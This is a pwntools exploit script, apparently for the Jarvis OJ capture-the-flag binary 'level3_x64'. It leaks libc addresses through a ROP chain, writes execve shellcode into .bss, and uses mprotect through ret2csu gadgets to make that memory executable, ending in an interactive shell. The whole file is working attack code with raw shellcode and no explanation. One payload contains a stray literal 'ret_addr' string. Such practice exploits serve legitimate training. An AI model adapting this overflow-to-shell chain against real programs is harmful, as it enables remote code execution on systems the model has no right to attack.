from pwn import *
context (arch='amd64',os='linux',log_level='debug')
p=process('./level3_x64')
#p=remote('pwn2.jarvisoj.com',9884)
libc=ELF('/usr/lib/x86_64-linux-gnu/libc-2.29.so')
#libc = ELF("./libc-2.19.so")
#gdb.attach(p)
e=ELF('./level3_x64')
write_got=e.got['write']
write_plt=e.plt['write']
read_got=e.got['read']
read_plt=e.plt['read']
vul_addr=e.symbols['vulnerable_function']
bss_addr=e.bss()
csu_front_addr=0x400690
csu_end_addr=0x4006a6
pop_rdi_ret=0x4006b3
pop_rsi_r15_ret=0x4006b1

###get write real address###
payload1='a'*0x88+p64(pop_rdi_ret)+p64(1)+p64(pop_rsi_r15_ret)+p64(write_got)+p64(0)+p64(write_plt)+p64(vul_addr)
p.sendafter("Input:\n",payload1)
temp=p.recv(8)
write_addr=u64(temp[0:8])
print hex(write_addr)
libcbase=write_addr-libc.symbols['write']
mprotect_addr=libcbase+libc.symbols['mprotect']

###shellcode###
#shellcode=asm(shellcraft.sh())
shellcode='\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
payload4='a'*0x88+p64(pop_rdi_ret)+p64(0)+p64(pop_rsi_r15_ret)+p64(bss_addr)+'a'*8+p64(read_plt)+p64(vul_addr)
p.sendafter("Input:\n",payload4)
p.send(shellcode)

###bss_got###
bss_got=0x600a48
payload2='a'*0x88+p64(pop_rdi_ret)+p64(0)+p64(pop_rsi_r15_ret)+p64(bss_got)+p64(0)+p64(read_plt)+p64(vul_addr)
p.sendafter("Input:\n",payload2)
p.send(p64(bss_addr))

###mprotect_got###
mprotect_got=0x600a50
payload3='a'*0x88+p64(pop_rdi_ret)+p64(0)+p64(pop_rsi_r15_ret)+p64(mprotect_got)+p64(0)+p64(read_plt)+p64(vul_addr)
p.sendafter("Input:\n",payload3)
p.send(p64(mprotect_addr))

###exceve shellcode###
gdb.attach(p)
payload5='a'*0x88+p64(csu_end_addr)+"ret_addr"
payload5+=p64(0)+p64(1)+p64(mprotect_got)+p64(7)+p64(0x1000)+p64(0x600000)
payload5+=p64(csu_front_addr)
payload5+='a'*56+p64(bss_addr)
p.sendafter("Input:\n",payload5)
p.interactive()
